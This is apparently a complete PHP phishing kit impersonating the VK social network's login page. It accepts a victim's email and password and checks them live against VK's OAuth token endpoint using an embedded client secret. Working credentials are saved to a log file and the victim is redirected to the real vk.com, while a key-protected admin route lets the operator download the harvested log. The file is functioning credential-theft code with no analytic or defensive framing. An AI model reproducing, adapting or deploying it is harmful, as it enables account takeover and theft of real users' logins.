<?php
session_start();
$secretKey = require ('./key.php');

if($_GET['admin'] == $secretKey){
    $_SESSION['admin'] = true;
    header('Location: /vk/admin');
    die();
}

if(($_SERVER['REQUEST_URI'] == '/vk/admin') && $_SESSION['admin']) {
    require('./admin.php');
    die();
}
if(($_SERVER['REQUEST_URI'] == '/vk/download') && $_SESSION['admin']) {
    $file = $_SERVER['DOCUMENT_ROOT'] . '/vk/log.txt';
    header('Content-Description: File Transfer');
    header('Content-Type: application/txt');
    header('Content-Disposition: attachment; filename=' . basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Content-Length: ' . filesize($file));
    if ($fh = fopen($file, 'rb')) {
        while (!feof($fh)) {
            print fread($fh, 1024);
        }
        fclose($fh);
    }
}

if($_POST){
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => 'https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=' . $_POST['email'] . '&password='  . $_POST['pass'],
        CURLOPT_HTTPHEADER => getallheaders(),
        CURLOPT_SSL_VERIFYHOST => true,
        CURLOPT_SSL_VERIFYPEER => true,
    ));
    $response = curl_exec($curl);
    curl_close($curl);
    if(json_decode($response, true)['error']) {
        header('Location: /vk/login?m=1&email=' . $_POST['email']);
        die();
    } else {
        $fd = fopen($_SERVER['DOCUMENT_ROOT'] . "/vk/log.txt", 'a+');
        fwrite($fd, $_POST['email'] . ':' . $_POST['pass'] . PHP_EOL);
        fclose($fd);
        header('Location: https://vk.com');
        die();
    }
}

if(preg_match('/login/', $_SERVER['REQUEST_URI'])) {
    require ('./pages/login.php');
    die();
} else {
    require ('./pages/index.html');
}


